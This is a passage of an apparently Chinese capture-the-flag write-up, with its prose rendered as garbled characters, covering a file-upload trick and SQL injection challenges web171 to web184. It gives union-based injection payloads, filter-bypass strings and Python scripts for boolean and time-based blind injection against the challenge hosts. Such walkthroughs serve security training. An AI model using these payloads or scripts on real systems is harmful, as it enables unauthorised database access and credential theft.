alt=""><br>Êé•ÁùÄÂæóÂÜç‰∏ä‰º†‰∏Ä‰∏™phpÊñá‰ª∂ÔºåÊª°Ë∂≥<code>.user.ini</code>ÁöÑÂà©Áî®ÊïàÊûúÔºåÂÜÖÂÆπÈöèÊÑè<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169/%5BE%25K2I%5D~M%293SW%5BO%7D1_%287GJ9.png" alt=""><br>ÁÑ∂ÂêéÂÜçÁî®ËöÅÂâëËøûÊé•uploadÁõÆÂΩï‰∏ãÁöÑ1.phpÂç≥ÂèØ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169/JG%5B0J7LKSAGJZZ0%5BN%5DW9~%24A.png" alt=""></p><h3 id="web170"><a class="header-anchor" href="#web170">¬∂</a>web170</h3><p>Âíå‰∏äÈ¢ò‰∏ÄÊ†∑ÁöÑÊñπÊ≥ï</p><h2 id="sqlÊ≥®ÂÖ•-171-253"><a class="header-anchor" href="#sqlÊ≥®ÂÖ•-171-253">¬∂</a>sqlÊ≥®ÂÖ•(171-253)</h2><h3 id="web171"><a class="header-anchor" href="#web171">¬∂</a>web171</h3><p>ÊâìÂºÄÈ¢òÁõÆÔºåÊé•‰∏ãÊù•150ÈÅìÂÖ®ÊòØsqlÊ≥®ÂÖ•‰∫ÜQWQÔºåÂÖàËæìÂÖ•1Êü•ËØ¢<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/FSI1%28MA%25MKN%7BYMRW1NWO81D.png" alt=""><br>ËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Êü•ËØ¢ËØ≠Âè•ÊòØËøôÊ†∑ÁöÑ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>ÂΩìÊàë‰ª¨ËæìÂÖ•id=1ÁöÑÊó∂ÂÄôÔºåËØ≠Âè•‰ª£ÂÖ•Êï∞ÊçÆÂ∫ì‰∏≠Êü•ËØ¢Â∞±‰ºöÂèòÊàêËøôÊ†∑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39; limit 1;</span><br></pre></td></tr></table></figure><p>Â¶ÇÊûúÊàë‰ª¨Âä†‰∏™ÂçïÂºïÂè∑ÔºåÂç≥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;&#39; limit 1;</span><br></pre></td></tr></table></figure><p>ËØ≠Âè•‰∏çËßÑËåÉÂ∞±‰ºöÊä•Èîô<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/LGZW%28DB%29Q7~%40%60%60KD%7DVQB4DR.png" alt=""><br>Â¶ÇÊûúÊàë‰ª¨Âú®ÂêéÈù¢Âä†‰∏™Ê≥®ÈáäÁ¨¶ÔºåÂç≥ÂèòÊàê<code>id=1'--+</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;--+&#39; limit 1;</span><br><span class="line">Ê≥®ÈáäÁ¨¶--+‰ºöÊääÂêéÈù¢ÁöÑËØ≠Âè•ÂÖ®Ê≥®ÈáäÊéâÔºåÂ∞±‰∏ç‰ºöÊä•ÈîôÔºåËØ≠Âè•Â∞±ÂèòÊàê‰∫Ü</span><br><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/_ENH4ILOVOROUAWSEF9V%5DF8.png" alt=""><br>Êé•‰∏ãÊù•Êàë‰ª¨Áî®<code>order by</code>ËØ≠Âè•ÊµãËØïÊúâÂ§öÂ∞ëÂàó</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 4 --+</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/SY%5DN4Y%28DZMFKCU4OS3QKYUS.png" alt=""><br>ÂèØ‰ª•ÁúãÂà∞4ÂàóÁöÑÊó∂ÂÄôÊä•ÈîôÔºåÊàë‰ª¨ÂÜçÂáèÂ∞èÊï∞Â≠ó<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/8%28%299RW79ZG%7DH4COV%7B%5B1%5BDNY.png" alt=""><br>3ÂàóÁöÑÊó∂ÂÄôÊ≠£Á°ÆÂõûÊòæ‰∫ÜÊï∞ÊçÆÔºåËØ¥ÊòéÂè™Êúâ‰∏âÂàó(ÂΩìÁÑ∂ÊòéÁúºÁöÑÂ∏àÂÇÖÂâçÈù¢Â∑≤ÁªèÁúãÂæóÂá∫ÊòØÂè™Êúâ‰∏âÂàó‰∫Ü)<br>Êé•‰∏ãÊù•ÔºåÊàë‰ª¨Êü•‰∏Ä‰∏ãÊï∞ÊçÆÂ∫ìÂêçÂ≠óÔºåËøôÈáåÁî®unionËØ≠Âè•Êù•ËøûÊé•Êü•ËØ¢ÔºåÂπ∂‰∏îÂú®ÂâçÈù¢ÊääidÊîπÊàê-1‰ª•ËææÂà∞ÊääÊü•ËØ¢idÂõûÊòæÁöÑÊï∞ÊçÆÁªôÁΩÆÁ©∫ÁöÑÁõÆÁöÑ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select database(),2,3 --+</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/6LLV7%5BKF%284A%5DV9JEPHT%7DH%5B7.png" alt=""><br>ÂõûÊòæÂá∫Êï∞ÊçÆÂ∫ìÂêçÂ≠ó‰∏∫ctfshow_webÔºåÊé•‰∏ãÊù•Êü•ËØ¢Ë°®ÔºåËøôÈáåÊàë‰ª¨Áî®group_concatÂáΩÊï∞ÔºåÂÆÉÂèØ‰ª•ÊääÁõ∏ÂêåË°åÁöÑÊï∞ÊçÆÈÉΩÁªÑÂêàËµ∑Êù•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/3D~%7DX%7DV34~B%5BW_%5D%25HX%28Z8UY.png" alt=""><br>Êü•Âá∫Ë°®Âêç‰∏∫ctfshow_userÔºåÊé•‰∏ãÊù•ÂÜçÂéªÊü•ÂàóÂêç</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user&quot;--+</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/43KMZ%253X54%25%28YL%24NKJ%40CYCT.png" alt=""><br>ÂæóÂà∞Êúâid,username,password‰∏â‰∏™ÂàóÂêçÔºåÁÑ∂ÂêéÂÜçpassword‰∏≠ÊâæÂà∞‰∫Üflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/5%407OH%24R%5BIP0Q7E0%29PO%2815%282.png" alt=""></p><h3 id="web172"><a class="header-anchor" href="#web172">¬∂</a>web172</h3><p>ËøôÊ¨°ÂèòÊàê‰∫Ü‰∏§Âàó</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 2 --+</span><br></pre></td></tr></table></figure><p>Êü•Êï∞ÊçÆÂ∫ìÂêç</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select database(),1--+</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞Êï∞ÊçÆÂ∫ìÂêçÂ≠ó‰∏∫ctfshow_webÔºåÊé•ÁùÄÊü•Ë°®Âêç</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select group_concat(table_name),1 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞Êúâ‰∏§‰∏™Ë°®Ôºåctfshow_userÂíåctfshow_user2ÔºåÁõ¥ËßâflagÂú®Á¨¨‰∫å‰∏™Ë°®‰∏≠(ÂêéÊù•ÁúãÂà∞‰ª£Á†ÅÈÉΩÊèêÁ§∫Á¨¨‰∫å‰∏™‰∫Ü)ÔºåÁõ¥Êé•Êü•Á¨¨‰∫å‰∏™Ë°®ÁöÑÂàóÂêç</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select group_concat(column_name),1 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user2&quot; --+</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞ÊúâidÔºåusernameÔºåpassword‰∏â‰∏™ÂàóÂêçÔºåÊü•password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select password,1 from ctfshow_user2--+</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞flag</p><h3 id="web173"><a class="header-anchor" href="#web173">¬∂</a>web173</h3><p>ËøôÊ¨°ÊµãÂá∫ÊòØ‰∏âÂàó</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 3 --+</span><br></pre></td></tr></table></figure><p>Ê†πÊçÆÂâçÈù¢Êàë‰ª¨Â∑≤ÁªèÊë∏Ê∏ÖÊï∞ÊçÆÂ∫ìÁªìÊûÑ‰∫ÜÔºåËøôÈáåÁõ¥Êé•Êü•passwordÂæóÂà∞flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select password,2,3 from ctfshow_user3--+</span><br></pre></td></tr></table></figure><h3 id="web174"><a class="header-anchor" href="#web174">¬∂</a>web174</h3><p>ËøôÈáåÊúâ‰∏™ÂùëÁÇπÔºåÂ∞±ÊòØÈÄâÊã©Á¨¨ÂõõÂÖ≥ÂêéÔºåurlËøòÊòØÁ¨¨‰∏âÂÖ≥ÁöÑÔºåÂæóÊâãÂä®ÊääÊï∞Â≠ó3ÊîπÊàê4<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web173/QQ%E6%88%AA%E5%9B%BE20210316164042.png" alt=""><br>ÊµãËØï‰∫Ü‰∏Ä‰∏ãÔºåÊúâ‰∏§ÂàóÔºå‰ΩÜÊ≤°ÊúâÂõûÊòæ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web173/_%5B1WGY9%29V3W9COO%7D%28UO%40%24%401.png" alt=""><br>ËøôÈáå‰ª£Á†ÅÂåπÈÖçÂà∞Êï∞Â≠óÂ∞±‰∏ç‰ºöÂõûÊòæÔºåÊàë‰ª¨ÂèØ‰ª•ÈááÁî®Áõ≤Ê≥®ÁöÑÊñπÂºèÊù•ÊµãËØïÔºåËøôÈáåÊàëÁî®ÁöÑsubstrËØ≠Âè•ÂíåÈ°µÈù¢ÂõûÊòæÊü•ËØ¢Âá∫ÁöÑadminËØ≠Âè•Êù•ÁªìÂêàÂà©Áî®ÔºåÂÜô‰∏Ä‰∏™ËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/16 16:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9ee16fc0-d13a-48ce-a43d-08dbe999e319.challenge.ctf.show:8080/api/v4.php&quot;</span></span><br><span class="line">dict = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and substr((select password from ctfshow_user4 where username=\&quot;flag\&quot;),<span class="subst">&#123;i&#125;</span>,1)=\&quot;<span class="subst">&#123;j&#125;</span>\&quot;--+&quot;</span></span><br><span class="line">        gloal = url + payload</span><br><span class="line">        res = requests.get(url=gloal)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂç≥ÂèØÂæóÂà∞flag<br>ÂΩìÁÑ∂ËøòÊúâÂÖ∂‰ªñÊÄùË∑ØÔºå‰æãÂ¶ÇÊääÊü•ËØ¢ÁöÑÁªìÊûúÂÜôÂà∞‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÔºåÁÑ∂ÂêéËÆøÈóÆÂ∞±Ë°å</p><h3 id="web175"><a class="header-anchor" href="#web175">¬∂</a>web175</h3><p>ËøôÈ¢òÁöÑÂåπÈÖçËßÑÂàôÊääasciiÁ†ÅË°®‰∏≠ÂÖ®ÈÉ®Â≠óÁ¨¶ÁªôÁ¶Å‰∫ÜÔºå‰∏çËøáÊàë‰ª¨ËøòÂèØ‰ª•Âà©Áî®Êó∂Èó¥Áõ≤Ê≥®ÁöÑÊñπÊ≥ïÊù•Âà§Êñ≠Ëé∑ÂèñflagÔºåÂÖàËØ¥‰∏Ä‰∏ãmysql‰∏≠ÁöÑifÂà§Êñ≠ÊñπÊ≥ïÂêß</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3)  </span><br></pre></td></tr></table></figure><p>Â¶ÇÊûú expr1 ÊòØTRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)ÔºåÂàô IF()ÁöÑËøîÂõûÂÄº‰∏∫expr2; Âê¶ÂàôËøîÂõûÂÄºÂàô‰∏∫ expr3„ÄÇÂÜô‰∏™Êó∂Èó¥Áõ≤Ê≥®ËÑöÊú¨Êù•Ë∑ë</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/16 16:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://9cb608df-e447-434e-b864-67001d4b869d.challenge.ctf.show:8080/api/v5.php&quot;</span></span><br><span class="line">dict = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(substr((select password from ctfshow_user5 where username=\&quot;flag\&quot;),<span class="subst">&#123;i&#125;</span>,1)=\&quot;<span class="subst">&#123;j&#125;</span>\&quot;,sleep(5),0)--+&quot;</span></span><br><span class="line">        gloal = url + payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url=gloal)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">4.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂæóÂà∞flag</p><h3 id="web176"><a class="header-anchor" href="#web176">¬∂</a>web176</h3><p>ËøôÊ¨°ÂºÄÂßãÊúâËøáÊª§Ê≥®ÂÖ•ÔºåÂÖàÊµãÂá∫Êúâ‰∏âÂàó</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 3--+</span><br></pre></td></tr></table></figure><p>fuzzÊµãËØï‰∏Ä‰∏ãÔºåÂèëÁé∞ÊòØÂØπselectËøõË°å‰∫ÜËøáÊª§ÔºåÊàë‰ª¨Â§ßÂ∞èÂÜôÁªïËøáÂ∞±Â•Ω‰∫ÜÔºåpaylaodÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union Select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure><p>ËøòÊúâÂè¶‰∏ÄÁßçÁÆÄÂçïÂäûÊ≥ïÔºåÊó¢ÁÑ∂Â≠òÂú®Ê≥®ÂÖ•ÔºåÁõ¥Êé•‰∏áËÉΩÂØÜÁ†ÅÂ∞±Â•Ω‰∫Ü<code>' or 1=1--+</code></p><h3 id="web177"><a class="header-anchor" href="#web177">¬∂</a>web177</h3><p>ËøôÊ¨°ÂèëÁé∞ËøòÂ§öËøáÊª§‰∫ÜÁ©∫Ê†ºÔºåÊàë‰ª¨ÂèØ‰ª•Áî®<code>%0a</code>Êç¢Ë°åÁ¨¶ÊàñËÄÖ<code>/**/</code>Ê≥®ÈáäÁ¨¶ÁªïËøá(ÊàñËÄÖ<code>%09,%0b,%0c,%0d</code>ÈÉΩÂèØ‰ª•)ÔºåËøôÊ¨°Êàë‰ª¨Áî®‰∏áËÉΩÂØÜÁ†ÅÂêßÔºåÁî®‰∏äÈù¢ÁöÑ‰πüÂèØ‰ª•Ôºå‰∏çËøáÁªïËøáÁ©∫Ê†ºÂêéÊúâÁÇπÈïøÔºåÂêéÈù¢ÁöÑÊ≥®ÈáäÊàë‰ª¨Áî®<code>#</code>ÁöÑurlÁºñÁ†ÅÂΩ¢Âºè<code>%23</code>Ôºåpayload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1%23</span><br></pre></td></tr></table></figure><h3 id="web178"><a class="header-anchor" href="#web178">¬∂</a>web178</h3><p>ËøôÊ¨°<code>/**/</code>Ë¢´ban‰∫ÜÔºåÊàë‰ª¨Êç¢<code>%0a</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;%0aor%0a1&#x3D;1%23</span><br></pre></td></tr></table></figure><h3 id="web179"><a class="header-anchor" href="#web179">¬∂</a>web179</h3><p>ËøôÊ¨°ÊµãËØï‰∏ÄËΩÆ‰∏ãÊù•ÔºåÂèëÁé∞Âè™Êúâ<code>%0c</code>ÂèØ‰ª•Áî®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;%0cor%0c1&#x3D;1%23</span><br></pre></td></tr></table></figure><h3 id="web180"><a class="header-anchor" href="#web180">¬∂</a>web180</h3><p>ËøôÊ¨°ÊääÂ∑≤Áü•ÁöÑËÉΩÁî®ÁöÑÁªïËøáÁ©∫Ê†ºÊñπÊ≥ïÈÉΩÁªôËøáÊª§‰∫ÜÔºå‰∏çËøáËøòÂèØ‰ª•ÈááÁî®ËøêÁÆóÁ¨¶ÁöÑÊñπÂºèÊù•Á≤æÂøÉÊûÑÈÄ†‰∏Ä‰∏™‰∏áËÉΩÂØÜÁ†ÅÔºåÂÖàÊîæÂá∫payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure><p>ÂâçÈù¢Êàë‰ª¨Â∑≤ÁªèÁü•ÈÅìË°®ÁöÑÁªìÊûÑÊòØ<code>id,username,password</code>ÔºåÊâÄ‰ª•Êàë‰ª¨ÈÄöËøáÊü•idÁöÑÊñπÂºèÂéªÊâæflagÔºåËÄåÁî®ËøêÁÆóÁ¨¶‰∏≠Ôºå<code>and</code>ÁöÑ‰ºòÂÖàÁ∫ßÊØî<code>or</code>È´òÔºåËøôÂè•ËØùÊîæÂà∞Êü•ËØ¢ËØ≠Âè•‰∏≠Â∞±ÂèòÊàê‰∫Ü</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;&#39;-1&#39;or(id&#x3D;26)and&#39;1&#39; limit 1;</span><br><span class="line">‰πüÂ∞±ÊòØ</span><br><span class="line">(id&#x3D;&#39;-1&#39;) or ((id&#x3D;26) and &#39;1&#39;) limit 1;</span><br><span class="line">ÂâçÈù¢‰∏∫0ÔºåÂêéÈù¢‰∏∫1ÔºåÊâÄ‰ª•Êï¥‰∏™Êù°‰ª∂‰∏∫1</span><br></pre></td></tr></table></figure><h3 id="web181"><a class="header-anchor" href="#web181">¬∂</a>web181</h3><p>ËøôÊ¨°ÂÄíÊòØÊääwafËØ≠Âè•ÁªôÊîæÂá∫Êù•‰∫ÜÔºåÂèØ‰ª•ÁúãÂà∞Ê≠£ÂàôÂåπÈÖçÊääÂ§ßÂ∞èÂÜôÁªôËøáÊª§ÔºåËøòÊòØ‰∏ÄÊ†∑Áî®‰∏äÈù¢ÁöÑpayloadÂèØ‰ª•Ëøá</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure><h3 id="web182"><a class="header-anchor" href="#web182">¬∂</a>web182</h3><p>‰∏ÄÊ†∑ÂèØ‰ª•Áî®‰∏äÈù¢ÁöÑpayloadÁªïËøá</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure><h3 id="web183"><a class="header-anchor" href="#web183">¬∂</a>web183</h3><p>ÊâìÂºÄÁΩëÁ´ôÂêéÊ†πÊçÆÊèêÁ§∫ÔºåÂà©Áî®post‰º†ÂèÇÔºåÂÄº‰∏∫Ë°®ÂêçÔºåÊ†πÊçÆ‰πãÂâçÁöÑÈ¢òÊàë‰ª¨Áü•ÈÅìË°®ÂêçÊòØ‚Äúctfshow_user‚ÄùÔºåÊâÄ‰ª•post‰∏Ä‰∏ã<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web183/IY873C%24J6DZB%5DXP9Q%25D%5BMO3.png" alt=""><br>ÂèëÁé∞ËøîÂõûÂÄº‰∏∫22ÔºåËØ¥ÊòéÊúâ22Ë°åÊï∞ÊçÆÔºåËøôÈáåÁúãËøîÂõûÈÄªËæëÊääÁ©∫Ê†ºÂíåÁ≠âÂè∑‰ª•Âèä‰∏Ä‰∫õÂ∏∏Áî®ÁöÑËØ≠Âè•ÁªôbanÊéâ‰∫ÜÔºåÁ©∫Ê†ºÁöÑËØùÂ∞ùËØïÁî®Êã¨Âè∑Êâ©‰ΩèÊù•ËÆ©ËØ≠Âè•Ê≠£Â∏∏ÊâßË°åÔºåÁ≠âÂè∑Áî®likeÊù•Êõø‰ª£ÔºåÁÑ∂ÂêéÁî®whereÂíå<code>%</code>Êù•ÂåπÈÖçÊï∞ÊçÆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postÔºötableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow%&#39;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web183/FCRGYUSVS0G%5B%7DVM6BO1GJO2.png" alt=""><br>ÂèëÁé∞ËøîÂõûÂÄº‰∏∫1ÔºåËØ¥ÊòéÊâßË°åÊàêÂäüÔºåÊàë‰ª¨ÂÜô‰∏Ä‰∏™ËÑöÊú¨Êù•Ë∑ëÂâ©‰∏ãÁöÑflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://adb1f64a-e1fd-4640-aeb5-b49da1a62390.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;0&#125;%&#x27;&quot;</span>.format(flag+j)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web184"><a class="header-anchor" href="#web184">¬∂</a>web184</h3><p>ËøôÊ¨°ÂÄíÊòØËøáÊª§‰∫ÜËõÆÂ§ö‰∏úË•øÔºåÂÉèwhereÂíåÂçïÂºïÂè∑ÂèåÂºïÂè∑Âï•ÁöÑÈÉΩÁªôban‰∫ÜÔºåËøôÈáåÊâìÁÆóÁî®&quot;right 